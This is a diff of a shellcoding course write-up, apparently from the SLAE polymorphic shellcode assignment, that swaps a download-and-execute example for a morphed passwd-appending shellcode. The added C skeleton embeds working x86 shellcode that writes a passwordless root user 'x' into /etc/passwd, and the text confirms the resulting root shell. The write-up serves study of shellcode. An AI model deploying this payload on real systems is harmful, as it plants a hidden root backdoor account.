@@ -99,7 +99,7 @@ ld -o a6-passwd a6-passwd.o
 objdump -d ./a6-passwd |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
 ```
 
-Set the opcodes for execution:
+Make an executable skeleton for the opcodes:
 
 ### passwd.c
 ```c
@@ -107,7 +107,7 @@ Set the opcodes for execution:
 #include<string.h>
 
 unsigned char code[] = \
-"\xeb\x32\x5e\x99\x88\x56\x18\x6a\x05\x58\x52\x6a\x64\x66\x68\x73\x77\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x31\xc9\x41\xb5\x04\xcd\x80\x93\x6a\x04\x58\x89\xf1\x6a\x19\x5a\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xc9\xff\xff\xff\x74\x6f\x6f\x72\x3a\x3a\x30\x3a\x30\x3a\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x43";
+"\xeb\x32\x5e\x99\x88\x56\x18\x6a\x05\x58\x52\x6a\x64\x66\x68\x73\x77\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x31\xc9\x41\xb5\x04\xcd\x80\x93\x6a\x04\x58\x89\xf1\x6a\x11\x5a\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xc9\xff\xff\xff\x78\x3a\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68";
 
 int main()
 {
@@ -117,25 +117,14 @@ int main()
 }
 ```
 
-And finally compile and execute:
+And finally compile, execute, and check:
 
-```
+![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/passwd/example.png "Example")
 
-```
-
-
-Let us go ahead and check if everything works as it should.
-
-![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/dlexec/example.png "Example")
-
-It looks like everything works as expected. The file is correctly downloaded, chmod'ed and executed, giving us a SUID root shell.
+Looks like everything works as expected. The new user `x` is able to use `/bin/sh` with root privileges.
 
 Now let's go on to check how the morphed version compares to the original shellcode.
 
-![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/dlexec/length.png "Shellcode length")
+![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/passwd/length.png "Shellcode length")
 
-Our morphed version is 96 bytes in length, which is of course 12 bytes shorter than the original 108 bytes. 
-
-
-
-
+Our morphed version is 74 bytes in length, which is of course 33 bytes shorter than the original 107 bytes. 
